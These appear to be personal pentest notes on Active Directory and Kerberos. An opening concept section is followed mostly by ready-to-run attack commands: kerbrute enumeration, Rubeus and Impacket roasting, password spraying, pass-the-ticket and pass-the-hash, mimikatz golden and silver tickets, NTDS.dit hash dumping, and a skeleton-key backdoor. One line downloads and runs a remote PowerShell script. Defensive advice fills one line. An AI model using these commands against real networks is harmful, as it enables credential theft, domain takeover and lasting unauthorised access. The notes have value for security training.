# AD DS

 The Active Directory Data Store holds the databases and processes needed to store and manage directory information such as users, groups, and services. Below is an outline of some of the contents and characteristics of the AD DS Data Store:

    Contains the NTDS.dit - a database that contains all of the information of an Active Directory domain controller as well as password hashes for domain users
    Stored by default in %SystemRoot%\NTDS
    accessible only by the domain controller
    
# ﻿Forest Overview 

﻿﻿A forest is a collection of one or more domain trees inside of an Active Directory network. It is what categorizes the parts of the network as a whole.

The Forest consists of these parts which we will go into farther detail with later:

    Trees - A hierarchy of domains in Active Directory Domain Services
    Domains - Used to group and manage objects 
    Organizational Units (OUs) - Containers for groups, computers, users, printers and other OUs
    Trusts - Allows users to access resources in other domains
    Objects - users, groups, printers, computers, shares
    Domain Services - DNS Server, LLMNR, IPv6
    Domain Schema - Rules for object creation      
    
    
#  Users Overview  

﻿Users are the core to Active Directory; without users why have Active Directory in the first place? There are four main types of users you'll find in an Active Directory network; however, there can be more depending on how a company manages the permissions of its users. The four types of users are: 

    Domain Admins - This is the big boss: they control the domains and are the only ones with access to the domain controller.
    Service Accounts (Can be Domain Admins) - These are for the most part never used except for service maintenance, they are required by Windows for services such as SQL to pair a service with a service account
    Local Administrators - These users can make changes to local machines as an administrator and may even be able to control other normal users, but they cannot access the domain controller
    Domain Users - These are your everyday users. They can log in on the machines they have the authorization to access and may have local administrator rights to machines depending on the organization.
    
    
 
# Groups Overview  

﻿Groups make it easier to give permissions to users and objects by organizing them into groups with specified permissions. There are two overarching types of Active Directory groups: 

    Security Groups - These groups are used to specify permissions for a large number of users
    Distribution Groups - These groups are used to specify email distribution lists. As an attacker these groups are less beneficial to us but can still be beneficial in enumeration

# Default Security Groups 

﻿There are a lot of default security groups so I won't be going into too much detail of each past a brief description of the permissions that they offer to the assigned group. Here is a brief outline of the security groups:

    Domain Controllers - All domain controllers in the domain
    Domain Guests - All domain guests
    Domain Users - All domain users
    Domain Computers - All workstations and servers joined to the domain
    Domain Admins - Designated administrators of the domain
    Enterprise Admins - Designated administrators of the enterprise
    Schema Admins - Designated administrators of the schema
    DNS Admins - DNS Administrators Group
    DNS Update Proxy - DNS clients who are permitted to perform dynamic updates on behalf of some other clients (such as DHCP servers).
    Allowed RODC Password Replication Group - Members in this group can have their passwords replicated to all read-only domain controllers in the domain
    Group Policy Creator Owners - Members in this group can modify group policy for the domain
    Denied RODC Password Replication Group - Members in this group cannot have their passwords replicated to any read-only domain controllers in the domain
    Protected Users - Members of this group are afforded additional protections against authentication security threats. See http://go.microsoft.com/fwlink/?LinkId=298939 for more information.
    Cert Publishers - Members of this group are permitted to publish certificates to the directory
    Read-Only Domain Controllers - Members of this group are Read-Only Domain Controllers in the domain
    Enterprise Read-Only Domain Controllers - Members of this group are Read-Only Domain Controllers in the enterprise
    Key Admins - Members of this group can perform administrative actions on key objects within the domain.
    Enterprise Key Admins - Members of this group can perform administrative actions on key objects within the forest.
    Cloneable Domain Controllers - Members of this group that are domain controllers may be cloned.
    RAS and IAS Servers - Servers in this group can access remote access properties of users   
    
    
# Domain Trusts Overview 

﻿Trusts are a mechanism in place for users in the network to gain access to other resources in the domain. For the most part, trusts outline the way that the domains inside of a forest communicate to each other, in some environments trusts can be extended out to external domains and even forests in some cases.   

There are two types of trusts that determine how the domains communicate. I'll outline the two types of trusts below: 

    Directional - The direction of the trust flows from a trusting domain to a trusted domain
    Transitive - The trust relationship expands beyond just two domains to include other trusted domains

The type of trusts put in place determines how the domains and trees in a forest are able to communicate and send data to and from each other when attacking an Active Directory environment you can sometimes abuse these trusts in order to move laterally throughout the network. 



# Domain Policies Overview - 

Policies are a very big part of Active Directory, they dictate how the server operates and what rules it will and will not follow. You can think of domain policies like domain groups, except instead of permissions they contain rules, and instead of only applying to a group of users, the policies apply to a domain as a whole. They simply act as a rulebook for Active  Directory that a domain admin can modify and alter as they deem necessary to keep the network running smoothly and securely. Along with the very long list of default domain policies, domain admins can choose to add in their own policies not already on the domain controller, for example: if you wanted to disable windows defender across all machines on the domain you could create a new group policy object to disable Windows Defender. The options for domain policies are almost endless and are a big factor for attackers when enumerating an Active Directory network. I'll outline just a few of the  many policies that are default or you can create in an Active Directory environment: 

    Disable Windows Defender - Disables windows defender across all machine on the domain
    Digitally Sign Communication (Always) - Can disable or enable SMB signing on the domain controller
    
    
  
  
# Domain Services
   
  Domain Services are exactly what they sound like. They are services that the domain controller provides to the rest of the domain or tree. There is a wide range of various services that can be added to a domain controller; however, in this room we'll only be going over the default services that come when you set up a Windows server as a domain controller. Outlined below are the default domain services: 

    LDAP - Lightweight Directory Access Protocol; provides communication between applications and directory services
    Certificate Services - allows the domain controller to create, validate, and revoke public key certificates
    DNS, LLMNR, NBT-NS - Domain Name Services for identifying IP hostnames  
    
# Domain Authentication Overview - 

The most important part of Active Directory -- as well as the most vulnerable part of Active Directory -- is the authentication protocols set in place. There are two main types of authentication in place for Active Directory: NTLM and Kerberos. 

    Kerberos - The default authentication service for Active Directory uses ticket-granting tickets and service tickets to authenticate users and give users access to other resources across the domain.
    NTLM - default Windows authentication protocol uses an encrypted challenge/response protocol

#Kerberos Pentesting

https://www.tarlogic.com/blog/how-to-attack-kerberos/



What is Kerberos? -  

Kerberos is the default authentication service for Microsoft Windows domains. It is intended to be more "secure" than NTLM by using third party ticket authorization as well as stronger encryption. Even though NTLM has a lot more attack vectors to choose from Kerberos still has a handful of underlying vulnerabilities just like NTLM that we can use to our advantage.

Common Terminology -  

    Ticket Granting Ticket (TGT) - A ticket-granting ticket is an authentication ticket used to request service tickets from the TGS for specific resources from the domain.
    Key Distribution Center (KDC) - The Key Distribution Center is a service for issuing TGTs and service tickets that consist of the Authentication Service and the Ticket Granting Service.
    Authentication Service (AS) - The Authentication Service issues TGTs to be used by the TGS in the domain to request access to other machines and service tickets.
    Ticket Granting Service (TGS) - The Ticket Granting Service takes the TGT and returns a ticket to a machine on the domain.
    Service Principal Name (SPN) - A Service Principal Name is an identifier given to a service instance to associate a service instance with a domain service account. Windows requires that services have a domain service account which is why a service needs an SPN set.
    KDC Long Term Secret Key (KDC LT Key) - The KDC key is based on the KRBTGT service account. It is used to encrypt the TGT and sign the PAC.
    Client Long Term Secret Key (Client LT Key) - The client key is based on the computer or service account. It is used to check the encrypted timestamp and encrypt the session key.
    Service Long Term Secret Key (Service LT Key) - The service key is based on the service account. It is used to encrypt the service portion of the service ticket and sign the PAC.
    Session Key - Issued by the KDC when a TGT is issued. The user will provide the session key to the KDC along with the TGT when requesting a service ticket.
    Privilege Attribute Certificate (PAC) - The PAC holds all of the user's relevant information, it is sent along with the TGT to the KDC to be signed by the Target LT Key and the KDC LT Key in order to validate the user.

AS-REQ w/ Pre-Authentication In Detail - 

The AS-REQ step in Kerberos authentication starts when a user requests a TGT from the KDC. In order to validate the user and create a TGT for the user, the KDC must follow these exact steps. The first step is for the user to encrypt a timestamp NT hash and send it to the AS. The KDC attempts to decrypt the timestamp using the NT hash from the user, if successful the KDC will issue a TGT as well as a session key for the user.

Ticket Granting Ticket Contents -

In order to understand how the service tickets get created and validated, we need to start with where the tickets come from; the TGT is provided by the user to the KDC, in return, the KDC validates the TGT and returns a service ticket.

Service Ticket Contents - 

To understand how Kerberos authentication works you first need to understand what these tickets contain and how they're validated. A service ticket contains two portions: the service provided portion and the user-provided portion. I'll break it down into what each portion contains.

    Service Portion: User Details, Session Key, Encrypts the ticket with the service account NTLM hash.
    User Portion: Validity Timestamp, Session Key, Encrypts with the TGT session key.
    
    
  Kerberos Authentication Overview -
  
  AS-REQ - 1.) The client requests an Authentication Ticket or Ticket Granting Ticket (TGT).

AS-REP - 2.) The Key Distribution Center verifies the client and sends back an encrypted TGT.

TGS-REQ - 3.) The client sends the encrypted TGT to the Ticket Granting Server (TGS) with the Service Principal Name (SPN) of the service the client wants to access.

TGS-REP - 4.) The Key Distribution Center (KDC) verifies the TGT of the user and that the user has access to the service, then sends a valid session key for the service to the client.

AP-REQ - 5.) The client requests the service and sends the valid session key to prove the user has access.

AP-REP - 6.) The service grants access

Kerberos Tickets Overview - 

The main ticket that you will see is a ticket-granting ticket these can come in various forms such as a .kirbi for Rubeus .ccache for Impacket. The main ticket that you will see is a .kirbi ticket. A ticket is typically base64 encoded and can be used for various attacks. The ticket-granting ticket is only used with the KDC in order to get service tickets. Once you give the TGT the server then gets the User details, session key, and then encrypts the ticket with the service account NTLM hash. Your TGT then gives the encrypted timestamp, session key, and the encrypted TGT. The KDC will then authenticate the TGT and give back a service ticket for the requested service. A normal TGT will only work with that given service account that is connected to it however a KRBTGT allows you to get any service ticket that you want allowing you to access anything on the domain that you want.

Attack Privilege Requirements -

    Kerbrute Enumeration - No domain access required 
    Pass the Ticket - Access as a user to the domain required
    Kerberoasting - Access as any user required
    AS-REP Roasting - Access as any user required
    Golden Ticket - Full domain compromise (domain admin) required 
    Silver Ticket - Service hash required 
    Skeleton Key - Full domain compromise (domain admin) required
    
    
### Enumerating AD users for kerberos attack

using tool called kerbrute


To enumerate avalible users for kerberos authentication use command


here dc is for domain controller and d is for domain. d is neccassary to specify
> ./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local WordLists/ADusers.txt 




# Harvesting(gathering)  tickets (Used in passtheticket attacks)

we can use a tool caleed rubeus.exe for this  purpose

This command tries to gather the ticket being generated every 30 seconds

> Rubeus.exe harvest /interval:30   (we can also specify specific user to target by adding /username:password in this command,also domain or domaincontroller)


# bruteforcing tickets 


 We can also use this tool to bruteforce users and then we can issue a TGT this way and connect to a secure service
 
 For this we will need to add the domain in targets host file 
 
 > echo targetsIP domain.name >> C:\Windows\System32\drivers\etc\hosts

Now we will perform the password spraying

> Rubeus.exe brute /password:Password1 /noticket

here Password1 is the provided password

This will give us a .kirbi ticket


# AS-REP roasting (DUmping Users hashes ,pre authentication disabled)

Very similar to Kerberoasting, AS-REP Roasting dumps the krbasrep5 hashes of user accounts that have Kerberos pre-authentication disabled. Unlike Kerberoasting these users do not have to be service accounts the only requirement to be able to AS-REP roast a user is the user must have pre-authentication disabled.During pre-authentication, the users hash will be used to encrypt a timestamp that the domain controller will attempt to decrypt to validate that the right hash is being used and is not replaying a previous request. After validating the timestamp the KDC will then issue a TGT for the user. If pre-authentication is disabled you can request any authentication data for any user and the KDC will return an encrypted TGT that can be cracked offline because the KDC skips the step of validating that the user is really who they say that they are.



Rubeus automatically enumerate eligible users havingpre authrntication disabled whereas impacket requires us to give a list of users 


on target we can check which users have pre authentication disabled through powershell

> get-aduser -filter * -properties DoesNotRequirePreAuth | where {$._DoesNotRequirePreAuth -eq "True" -and $_.Enabled -eq "True"} | select Name



### Rubeus AS-REP roasting

using rubeus is prefereed because it automatically enumerate users

> Rubeus.exe asreproast  (we can also specify specific user to target by adding /username:password in this command. also domain or domaincontroller)

                or
                
> iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat <TGSs_format [hashcat | john]> | % { $_.Hash } | Out-File -Encoding ASCII <output_TGSs_file>
                
                

### Impacket AS-REP roasting

we require list of usernames on target. we can find those from kerbrute and supply here


        Without AUthentication

> sudo python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py domain.name/ -dc-ip IPADDRESS users kerbuser.txt -no-pass
   
              With Authentication                                                    OR 

> sudo python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py domain.name/Machine1:Password1 -dc-ip IPADDRESS -users kerbuser.txt -no-pass




# Kerbroasting

Kerberoasting allows a user to request a service ticket for any service with a registered SPN then use that ticket to crack the service password. If the service has a registered SPN then it can be Kerberoastable however the success of the attack depends on how strong the password is and if it is trackable as well as the privileges of the cracked service account. To enumerate Kerberoastable accounts I would suggest a tool like BloodHound to find all Kerberoastable accounts, it will allow you to see what kind of accounts you can kerberoast if they are domain admins, and what kind of connections they have to the rest of the domain. That is a bit out of scope for this room but it is a great tool for finding accounts to target.


### kerbroasting using rebeus

This command will dump hashes of available service accounts


> Rubeus.exe kerberoast   (we can also specify specific user to target by adding /username:password in this command.also domain or domaincontroller)
 

NOw copy the hash and crack in our machine


What Can a Service Account do?

After cracking the service account password there are various ways of exfiltrating data or collecting loot depending on whether the service account is a domain admin or not. If the service account is a domain admin you have control similar to that of a golden/silver ticket and can now gather loot such as dumping the NTDS.dit. If the service account is not a domain admin you can use it to log into other systems and pivot or escalate or you can use that cracked password to spray against other service and domain admin accounts; many companies may reuse the same or similar passwords for their service or domain admin users. If you are in a professional pen test be aware of how the company wants you to show risk most of the time they don't want you to exfiltrate data and will set a goal or process for you to get in order to show risk inside of the assessment.


### KERBROASTING USING IMPACKET suite

This can be done remotely but for this we need a remote connection as any user on the target system

controller.local is domain name , Machine1 is PC name and Password1 is a password

> sudo python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.172.234 -request





# Ticket formats converting(linux and windows)

we can use ticket_converter.py to convert the types
ccache is compatible with linux and kirbi with windows

python ticket_converter.py ticket.kirbi ticket.ccache
python ticket_converter.py ticket.ccache ticket.kirbi

# Pass the ticket attack

Pass the Ticket Overview - 
Pass the ticket works by dumping the TGT from the LSASS memory of the machine. The Local Security Authority Subsystem Service (LSASS) is a memory process that stores credentials on an active directory server and can store Kerberos ticket along with other credential types to act as the gatekeeper and accept or reject the credentials provided. You can dump the Kerberos Tickets from the LSASS memory just like you can dump hashes. When you dump the tickets with mimikatz it will give us a .kirbi ticket which can be used to gain domain admin if a domain admin ticket is in the LSASS memory. This attack is great for privilege escalation and lateral movement if there are unsecured domain service account tickets laying around. The attack allows you to escalate to domain admin if you dump a domain admin's ticket and then impersonate that ticket using mimikatz PTT attack allowing you to act as that domain admin. You can think of a pass the ticket attack like reusing an existing ticket were not creating or destroying any tickets here were simply reusing an existing ticket from another user on the domain and impersonating that ticket.


### using Rubeus

1. First we need to be a user of administrator group for this attack

2. We run following command to dump all the tickets from lsaas

> rubues.exe dump

3. Now we need to look for Admin users or any users which have krbtgt service access meaning they are kerberos service accounts and if we are succesful the whole domain can be compromised

3. We can now will now add the contennts of the ticket to be compromised in a file using powershell

> [IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("BASE64TICKETCONTENTS"))

4. Now a file named ticket.kirbi is made and we can now inject this ticket into memory to impersonate as the ticket owner	
 
> .\Rubeus.exe ptt /ticket:ticket.kirbi

5. NOw we have priveleges of the user same as whse ticket we just exploited


### using mimikatz

This attack requires atleast loacl administrator priveleges 

1. Run mimikatz to get in its shell

> mimikatz.exe

2. check our priveleges that if we can perfrom this attack or not

> privilege::debug

3. Now we export the tickets in our working directory

> sekurlsa::tickets /export  (we can also specify different things to export instaead of tickets . The sekrulsa support many different things to be dumped)

4. we must choose those .kirbi tickets which have full domain access (krbtgt) and also admin access.They should have this keyword in it

5. Now we will use this ticket and impersonate as domain admin

> kerberos::ptt ticketname 
 

6. The following command will verify if we succesfuly cached the domain admin tikcet in our cache table

> klist


### using Impacket

1. First we add our ticket file to default env variable if Impacket
 
> export KRB5CCNAME=ticket.ccache  

2. Now connect to the machine using ps exec

> python psexec.py jurassic.park/trex@labwws02.jurassic.park -k -no-pass

 
Pass the Ticket Mitigation -

Let's talk blue team and how to mitigate these types of attacks. 


    Don't let your domain admins log onto anything except the domain controller - This is something so simple however a lot of domain admins still log onto low-level computers leaving tickets around that we can use to attack and move laterally with.

# Golden and silver tickets

A silver ticket can sometimes be better used in engagements rather than a golden ticket because it is a little more discreet. If stealth and staying undetected matter then a silver ticket is probably a better option than a golden ticket however the approach to creating one is the exact same. The key difference between the two tickets is that a silver ticket is limited to the service that is targeted whereas a golden ticket has access to any Kerberos service.

A specific use scenario for a silver ticket would be that you want to access the domain's SQL server however your current compromised user does not have access to that server. You can find an accessible service account to get a foothold with by kerberoasting that service, you can then dump the service hash and then impersonate their TGT in order to request a service ticket for the SQL service from the KDC allowing you access to the domain's SQL server.


the ticket which we impersonate can be that of a  domain admin or the kerberos service itself.

### Using Mimikatz

This attack requires atleast loacal administrator priveleges 

1. Run mimikatz to get in its shell

> mimikatz.exe

2. check our priveleges that if we can perfrom this attack or not

> privilege::debug

3. Now we will dump all tickets having accss to krbtgt

> lsadump::lsa /inject /name:krbtgt   ( To create a silver ticket you need to change the /name: to dump the hash of either a domain admin account or a service account such as the SQLService account.)

4. creating our ticket


> Kerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt: /id: (to create a silver ticket simply put a service NTLM hash into the krbtgt slot, the sid of the service account into sid, and id of account in /id:)

This all is found in previous steps:
specify sid value in /sid:
specify ntlm hash in /krbtgt:
specify id number in /id:

We can also specify /ptt at the end of above command and the ticket will be injected rightaway in our session. This can be stealthy as Blueteams can detect the kirbi ticket being made


5. NOw type following command to open prompt with privileges of the created golden or silver tickets

> misc::cmd

# Pass the hash attack

In active directory evironment , if we have a users hash then we can request a TGT for that user account. Lets assume we have found local administrator hash but we are looking to compromise whole domain so we can pwerform this attack

## using Rebeus

1. We run the command to ask KDC to grant us a tgt just like a normal user would. THe only change is this that we are using users hash and impersanating as that user

> .\Rubeus.exe asktgt /domain:domain.name /user:username /rc4:USERHASH /ptt 

This command outputs the ticket for that user and then using the powershell input streamer which we used in pass the tickets attack we can write to a file and then use rubeus to inject the ticket into memory

## Using Impacket (REmote attack)

We must have credentials and a way to login machine remotley

### Request the TGT with hash
python getTGT.py <domain_name>/<user_name> -hashes [lm_hash]:<ntlm_hash>
### Request the TGT with aesKey (more secure encryption, probably more stealth due is the used by default by Microsoft)
python getTGT.py <domain_name>/<user_name> -aesKey <aes_key>
### Request the TGT with password
python getTGT.py <domain_name>/<user_name>:[password]

 If not provided, password is asked
 
  
# Dumping NTDS.dit remotely and locally

Good resource= https://www.ired.team/offensive-security/credential-access-and-credential-dumping/ntds.dit-enumeration

LOCALLY :

If we have access to domain controller we can directly dump ntds.dit through powershell

> powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
 
 This will dump a ntds and system hive in specified directory. We can then copy it back to our machine and dump hashes using secretsdump.py
 
 > /usr/bin/impacket-secretsdump -system SYSTEM -security SECURITY -ntds ntds.dit local


REMOTELY:

If we have valid credentials for a domain controller then we can dump all the hashes directly from our machine

> python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -just-dc-ntlm domain.name/username@IPADDRESS




# Remote sessions with injected golden tickets (Optional)

Using above techniques we can get a ticket and then we can transfer to our machine and convert it into linux compatible format (ccache)

1. THen we export the ticket in a anve variable used by imapacket

> export KRB5CCNAME=ticket.ccache  

2. Now connect to the machine using ps exec

> python psexec.py jurassic.park/trex@labwws02.jurassic.park -k -no-pass

the -k and -no-pass flags triggers the impacket to use our ticket in our pty.


# AD backdoor and Persistance

### Skeleton Key Overview -

The skeleton key works by abusing the AS-REQ encrypted timestamps as I said above, the timestamp is encrypted with the users NT hash. The domain controller then tries to decrypt this timestamp with the users NT hash, once a skeleton key is implanted the domain controller tries to decrypt the timestamp using both the user NT hash and the skeleton key NT hash allowing you access to the domain forest.

The Kerberos backdoor works by implanting a skeleton key that abuses the way that the AS-REQ validates encrypted timestamps. A skeleton key only works using Kerberos RC4 encryption. 


This attack requires atleast loacal administrator priveleges 

1. Run mimikatz to get in its shell

> mimikatz.exe

2. check our priveleges that if we can perfrom this attack or not

> privilege::debug

3. Now  we implant the skeleton key in the AD Forest

> misc::skeleton
This allows us to access any share of any machine on any  domain in the forest without ever enumurating it from the start beccause we already have a golden ticket and we make our access more easy



### Accessing the Forest

The default credentials will be: "mimikatz"

We can now make admin shares for our current user with elevated privileges persistent.we can configure any shares to accept us without authentication by follwoing command example

example: net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz - The share will now be accessible without the need for the Administrators password

example: dir \\Desktop-1\c$ /user:Machine1 mimikatz - access the directory of Desktop-1 without ever knowing what users have access to Desktop-1
